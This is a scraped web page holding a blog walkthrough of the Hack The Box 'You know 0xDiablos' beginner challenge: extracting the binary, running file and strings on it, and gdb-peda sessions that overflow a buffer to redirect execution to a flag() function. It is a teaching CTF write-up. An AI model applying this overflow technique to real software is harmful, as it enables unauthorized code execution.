function\n# gdb command b flag # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ gdb -q vuln Reading symbols from vuln... (No debugging symbols found in vuln) gdb-peda$ b flag Breakpoint 1 at 0x80491e6 gdb-peda$ before feeding the executable our new payload.\n# gdb command r \u003c payload.txt # terminal interaction gdb-peda$ r \u003c payload.txt Starting program: /home/htb-bluewalle/you-know-0xdiablos/vuln \u003c payload.txt You know who are 0xDiablos: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA� [----------------------------------registers-----------------------------------] EAX: 0xc1 EBX: 0x41414141 ('AAAA') ECX: 0xffffffff EDX: 0xffffffff ESI: 0xf7faa000 --\u003e 0x1e3d6c EDI: 0xf7faa000 --\u003e 0x1e3d6c EBP: 0xffffd05c (\"AAAA\") ESP: 0xffffd058 (\"AAAAAAAA\") EIP: 0x80491e6 (:\tsub esp,0x54) EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80491e2 :\tpush ebp 0x80491e3 :\tmov ebp,esp 0x80491e5 :\tpush ebx =\u003e 0x80491e6 :\tsub esp,0x54 0x80491e9 :\tcall 0x8049120 \u003c__x86.get_pc_thunk.bx\u003e 0x80491ee :\tadd ebx,0x2e12 0x80491f4 :\tsub esp,0x8 0x80491f7 :\tlea eax,[ebx-0x1ff8] [------------------------------------stack-------------------------------------] 0000| 0xffffd058 (\"AAAAAAAA\") 0004| 0xffffd05c (\"AAAA\") 0008| 0xffffd060 --\u003e 0x0 0012| 0xffffd064 --\u003e 0xffffd134 --\u003e 0xffffd2ca (\"/home/htb-bluewalle/you-know-0xdiablos/vuln\") 0016| 0xffffd068 --\u003e 0xffffd13c --\u003e 0xffffd2f6 (\"SHELL=/bin/bash\") 0020| 0xffffd06c --\u003e 0x3eb 0024| 0xffffd070 --\u003e 0xffffd090 --\u003e 0x1 0028| 0xffffd074 --\u003e 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0x080491e6 in flag () gdb-peda$ It worked, the execution flow was successfully redirected to the flag() function. Taking an other look at the decompiled flag() function, we notice our next hurdle:\n... if (local_10 != (FILE *)0x0) ... Put plainly, we can only pass if the file mentioned - flag.txt - was successfully opened. So let’s create such a file locally.\n# shell command echo -n \"SUCCESS\" \u003e flag.txt # terminal interaction ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ echo -n \"SUCCESS\" \u003e flag.txt ┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ cat flag.txt SUCCESS┌─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ Let’s run gdb again\n# gdb commands b flag r \u003c payload.txt # terminal interaction ─[eu-dedivip-1]─[10.10.14.11]─[htb-bluewalle@htb-xyiqhjz8bb]─[~/you-know-0xdiablos] └──╼ [★]$ gdb -q vuln Reading symbols from vuln... (No debugging symbols found in vuln) gdb-peda$ b flag Breakpoint 1 at 0x80491e6 gdb-peda$ r \u003c payload.txt Starting program: /home/htb-bluewalle/you-know-0xdiablos/vuln \u003c payload.txt You know who are 0xDiablos: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���Aﾭ� [----------------------------------registers-----------------------------------] EAX: 0xcd EBX: 0x41414141 ('AAAA') ECX: 0xffffffff EDX: 0xffffffff ESI: 0xf7faa000 --\u003e 0x1e3d6c EDI: 0xf7faa000 --\u003e 0x1e3d6c EBP: 0xffffd05c (\"AAAAAAAAﾭ\\336\\r\\320\\336\\300\") ESP: 0xffffd058 ('A' ","wordCount":"3994","inLanguage":"en","datePublished":"2023-05-31T15:00:00Z","dateModified":"2023-05-31T15:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/beginner-track/you-know-0xdiablos/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/favicon.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/apple-touch-icon.png alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - You know 0xDiablos - Walkthrough</h1><div class=post-meta><span title='2023-05-31 15:00:00 +0000 +0000'>May, 2023</span>&nbsp;·&nbsp;19 min&nbsp;·&nbsp;3994 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#preparing-challenge-files><strong>PREPARING-CHALLENGE-FILES</strong></a></li><li><a href=#information-gathering><strong>INFORMATION-GATHERING</strong></a></li><li><a href=#reverse-engineering--static-analysis><strong>REVERSE-ENGINEERING&ndash;STATIC-ANALYSIS</strong></a></li><li><a href=#buffer-overflow-vulnerabilities><strong>BUFFER-OVERFLOW-VULNERABILITIES</strong></a></li><li><a href=#gdb-peda><strong>GDB-PEDA</strong></a></li><li><a href=#generating-payload-with-pwntools><strong>GENERATING-PAYLOAD-WITH-PWNTOOLS</strong></a></li><li><a href=#verifying-the-results><strong>VERIFYING-THE-RESULTS</strong></a></li></ul></nav></div></details></div><div class=post-content><p>The aim of this walkthrough is to provide help with the <a href=https://app.hackthebox.com/challenges/106 title="You know 0xDiablos">You know 0xDiablos</a> challenge on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out with finishing the <a href=https://app.hackthebox.com/tracks/Beginner-Track title=Beginner-Track>Beginner-Track</a> challenges.</p><h2 id=preparing-challenge-files><strong>PREPARING-CHALLENGE-FILES</strong><a hidden class=anchor aria-hidden=true href=#preparing-challenge-files>#</a></h2><p>After a quick look at the <strong>challenge description</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>I missed my flag
</span></span></code></pre></div><p>we proceed directly by <strong>downloading</strong> the <strong>challenge files</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/beginner-track/you-know-0xdiablos/downloading-challenge.png alt=downloading-challenge title=downloading-challenge></p><p>There is only one <strong>compressed file</strong> called - <em>You know 0xDiablos.zip</em> - and we use the provided <strong>sha256</strong> <strong>checksum</strong> to verify it&rsquo;s <strong>integrity</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -n <span class=s2>&#34;307744fa0ae574756157a4607e307492141fdf1f000f6289eab4a8741729469c  You know 0xDiablos.zip&#34;</span> <span class=p>|</span> sha256sum -c
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 4.0K
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle 3.0K May <span class=m>31</span> 22:01 <span class=s1>&#39;You know 0xDiablos.zip&#39;</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ <span class=nb>echo</span> -n <span class=s2>&#34;307744fa0ae574756157a4607e307492141fdf1f000f6289eab4a8741729469c  You know 0xDiablos.zip&#34;</span> <span class=p>|</span> sha256sum -c
</span></span><span class=line><span class=cl>You know 0xDiablos.zip: OK
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>It looks like our file has <strong>not been tampered with</strong> so we continue by <strong>decompressing</strong> it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>unzip -P hackthebox You<span class=se>\ </span>know<span class=se>\ </span>0xDiablos.zip
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ unzip -P hackthebox You<span class=se>\ </span>know<span class=se>\ </span>0xDiablos.zip 
</span></span><span class=line><span class=cl>Archive:  You know 0xDiablos.zip
</span></span><span class=line><span class=cl>   skipping: vuln                    need PK compat. v5.1 <span class=o>(</span>can <span class=k>do</span> v4.6<span class=o>)</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>But when trying to <strong>decompress</strong> the <strong>archive</strong>, we get an <strong>error</strong> back. Looking for a fix online steers us towards the <em><strong>7z</strong></em> file <strong>archiver</strong>. And since it&rsquo;s already installed on the <strong>pwnbox</strong>, all that&rsquo;s left for us now is to run it and <strong>extract</strong> the files.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>7z x -phackthebox You<span class=se>\ </span>know<span class=se>\ </span>0xDiablos.zip
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 7z x -phackthebox You<span class=se>\ </span>know<span class=se>\ </span>0xDiablos.zip 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>7-Zip <span class=o>[</span>64<span class=o>]</span> 16.02 : Copyright <span class=o>(</span>c<span class=o>)</span> 1999-2016 Igor Pavlov : 2016-05-21
</span></span><span class=line><span class=cl>p7zip Version 16.02 <span class=o>(</span><span class=nv>locale</span><span class=o>=</span>en_GB.UTF-8,Utf16<span class=o>=</span>on,HugeFiles<span class=o>=</span>on,64 bits,4 CPUs DO-Regular <span class=o>(</span>306F2<span class=o>)</span>,ASM,AES-NI<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Scanning the drive <span class=k>for</span> archives:
</span></span><span class=line><span class=cl><span class=m>1</span> file, <span class=m>3058</span> bytes <span class=o>(</span><span class=m>3</span> KiB<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Extracting archive: You know 0xDiablos.zip
</span></span><span class=line><span class=cl>--
</span></span><span class=line><span class=cl><span class=nv>Path</span> <span class=o>=</span> You know 0xDiablos.zip
</span></span><span class=line><span class=cl><span class=nv>Type</span> <span class=o>=</span> zip
</span></span><span class=line><span class=cl>Physical <span class=nv>Size</span> <span class=o>=</span> <span class=m>3058</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Everything is Ok
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Size:       <span class=m>15656</span>
</span></span><span class=line><span class=cl>Compressed: <span class=m>3058</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 20K
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle  16K Nov  <span class=m>2</span>  <span class=m>2019</span>  vuln
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle 3.0K May <span class=m>31</span> 22:01 <span class=s1>&#39;You know 0xDiablos.zip&#39;</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><h2 id=information-gathering><strong>INFORMATION-GATHERING</strong><a hidden class=anchor aria-hidden=true href=#information-gathering>#</a></h2><p>Looking at the result, the <strong>archive</strong> contains only one file:</p><ul><li><em>vuln</em></li></ul><p>Getting a better read on it</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>file vuln
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ file vuln
</span></span><span class=line><span class=cl>vuln: ELF 32-bit LSB executable, Intel 80386, version <span class=m>1</span> <span class=o>(</span>SYSV<span class=o>)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, BuildID<span class=o>[</span>sha1<span class=o>]=</span>ab7f19bb67c16ae453d4959fba4e6841d930a6dd, <span class=k>for</span> GNU/Linux 3.2.0, not stripped
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>reveals it as a <strong>linux executable</strong>, so we give it <strong>execution rights</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>chmod a+x vuln
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 20K
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle  16K Nov  <span class=m>2</span>  <span class=m>2019</span>  vuln
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle 3.0K May <span class=m>31</span> 22:01 <span class=s1>&#39;You know 0xDiablos.zip&#39;</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ chmod a+x vuln
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 20K
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> htb-bluewalle htb-bluewalle  16K Nov  <span class=m>2</span>  <span class=m>2019</span>  vuln
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle 3.0K May <span class=m>31</span> 22:01 <span class=s1>&#39;You know 0xDiablos.zip&#39;</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p><strong>Running</strong> a file name <em>vuln</em> sounds like a great idea, so why not do it? :)</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>./vuln
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ./vuln 
</span></span><span class=line><span class=cl>You know who are 0xDiablos: 
</span></span><span class=line><span class=cl><span class=nb>test</span>
</span></span><span class=line><span class=cl><span class=nb>test</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>At our first run, seemingly all the program did was to <strong>echo</strong> our input back to us. Hopefully we get more luck with the <strong>printable characters</strong> from the binary.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># shell command</span>
</span></span><span class=line><span class=cl>strings vuln &gt; vuln-strings.txt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># terminal interaction</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ strings vuln &gt; vuln-strings.txt
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-1<span class=o>]</span>─<span class=o>[</span>10.10.14.11<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-xyiqhjz8bb<span class=o>]</span>─<span class=o>[</span>~/you-know-0xdiablos<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat vuln-strings.txt 
</span></span><span class=line><span class=cl>tdX 
</span></span><span class=line><span class=cl>/lib/ld-linux.so.2
</span></span><span class=line><span class=cl>libc.so.6
</span></span><span class=line><span class=cl>_IO_stdin_used
</span></span><span class=line><span class=cl><span class=nb>exit</span>
</span></span><span class=line><span class=cl>fopen
</span></span><span class=line><span class=cl>puts
</span></span><span class=line><span class=cl><span class=nb>printf</span>
</span></span><span class=line><span class=cl>fgets
</span></span><span class=line><span class=cl>stdout
</span></span><span class=line><span class=cl>setresgid
</span></span><span class=line><span class=cl>getegid
</span></span><span class=line><span class=cl>setvbuf
</span></span><span class=line><span class=cl>__libc_start_main
</span></span><span class=line><span class=cl>GLIBC_2.1
</span></span><span class=line><span class=cl>GLIBC_2.0
</span></span><span class=line><span class=cl>__gmon_start__
</span></span><span class=line><span class=cl><span class=o>[</span>^_<span class=o>]</span>
</span></span><span class=line><span class=cl>flag.txt
</span></span><span class=line><span class=cl>Hurry up and try in on server side.
</span></span><span class=line><span class=cl>You know who are 0xDiablos: 
</span></span><span class=line><span class=cl><span class=p>;</span>*2$<span class=s2>&#34; 
</span></span></span><span class=line><span class=cl><span class=s2>GCC: (Debian 8.3.0-19) 8.3.0
</span></span></span><span class=line><span class=cl><span class=s2>crtstuff.c
</span></span></span><span class=line><span class=cl><span class=s2>deregister_tm_clones
</span></span></span><span class=line><span class=cl><span class=s2>__do_global_dtors_aux
</span></span></span><span class=line><span class=cl><span class=s2>completed.6887
</span></span></span><span class=line><span class=cl><span class=s2>__do_global_dtors_aux_fini_array_entry
</span></span></span><span class=line><span class=cl><span class=s2>frame_dummy
</span></span></span><span class=line><span class=cl><span class=s2>__frame_dummy_init_array_entry
</span></span></span><span class=line><span class=cl><span class=s2>vuln.c
</span></span></span><span class=line><span class=cl><span class=s2>__FRAME_END__
</span></span></span><span class=line><span class=cl><span class=s2>__init_array_end
</span></span></span><span class=line><span class=cl><span class=s2>_DYNAMIC
</span></span></span><span class=line><span class=cl><span class=s2>__init_array_start
</span></span></span><span class=line><span class=cl><span class=s2>__GNU_EH_FRAME_HDR
</span></span></span><span class=line><span class=cl><span class=s2>_GLOBAL_OFFSET_TABLE_
</span></span></span><span class=line><span class=cl><span class=s2>__libc_csu_fini
</span></span></span><span class=line><span class=cl><span class=s2>__x86.get_pc_thunk.bx
</span></span></span><span class=line><span class=cl><span class=s2>printf@@GLIBC_2.0
</span></span></span><span class=line><span class=cl><span class=s2>__x86.get_pc_thunk.bp
</span></span></span><span class=line><span class=cl><span class=s2>vuln
</span></span></span><span class=line><span class=cl><span class=s2>fgets@@GLIBC_2.0
</span></span></span><span class=line><span class=cl><span class=s2>_edata
</span></span></span><span class=line><span class=cl><span class=s2>getegid@@GLIBC_2.0
</span></span></span><span class=line><span class=cl><span class=s2>__data_start
</span></span></span><span class=line><span class=cl><span class=s2>puts@@GLIBC_2.0
</span></span></span><span class=line><span class=cl><span class=s2>__gmon_start__
</span></span></span><span class=line><span class=cl><span class=s2>exit@@GLIBC_2.0
</span></span></span><span class=line><span class=cl><span class=s2>__dso_handle
</span></span></span><span class=line><span class=cl><span class=s2>_IO_stdin_used
</span></span></span><span class=line><span class=cl><span class=s2>__libc_start_main@@GLIBC_2.0
</span></span></span><span class=line><span class=cl><span class=s2>__libc_csu_init
</span></span></span><span class=line><span class=cl><span class=s2>setvbuf@@GLIBC_2.0
</span></span></span><span class=line><span class=cl><span class=s2>fopen@@GLIBC_2.1
</span></span></span><span class=line><span class=cl><span class=s2>_dl_relocate_static_pie
</span></span></span><span class=line><span class=cl><span class=s2>_fp_hw
</span></span></span><span class=line><span class=cl><span class=s2>stdout@@GLIBC_2.0
</span></span></span><span class=line><span class=cl><span class=s2>__bss_start
</span></span></span><span class=line><span class=cl><span class=s2>main
</span></span></span><span class=line><span class=cl><span class=s2>__TMC_END__
</span></span></span><span class=line><span class=cl><span class=s2>setresgid@@GLIBC_2.0
</span></span></span><span class=line><span class=cl><span class=s2>flag
</span></span></span><span class=line><span class=cl><span class=s2>.symtab
</span></span></span><span class=line><span class=cl><span class=s2>.strtab
</span></span></span><span class=line><span class=cl><span class=s2>.shstrtab
</span></span></span><span class=line><span class=cl><span class=s2>.interp
</span></span></span><span class=line><span class=cl><span class=s2>.note.gnu.build-id
</span></span></span><span class=line><span class=cl><span class=s2>.note.ABI-tag
</span></span></span><span class=line><span class=cl><span class=s2>.gnu.hash
</span></span></span><span class=line><span class=cl><span class=s2>.dynsym
</span></span></span><span class=line><span class=cl><span class=s2>.dynstr
</span></span></span><span class=line><span class=cl><span class=s2>.gnu.version
</span></span></span><span class=line><span class=cl><span class=s2>.gnu.version_r
</span></span></span><span class=line><span class=cl><span class=s2>.rel.dyn
</span></span></span><span class=line><span class=cl><span class=s2>.rel.plt
</span></span></span><span class=line><span class=cl><span class=s2>.init
</span></span></span><span class=line><span class=cl><span class=s2>.text
</span></span></span><span class=line><span class=cl><span class=s2>.fini
</span></span></span><span class=line><span class=cl><span class=s2>.rodata
</span></span></span><span class=line><span class=cl><span class=s2>.eh_frame_hdr
</span></span></span><span class=line><span class=cl><span class=s2>.eh_frame
</span></span></span><span class=line><span class=cl><span class=s2>.init_array
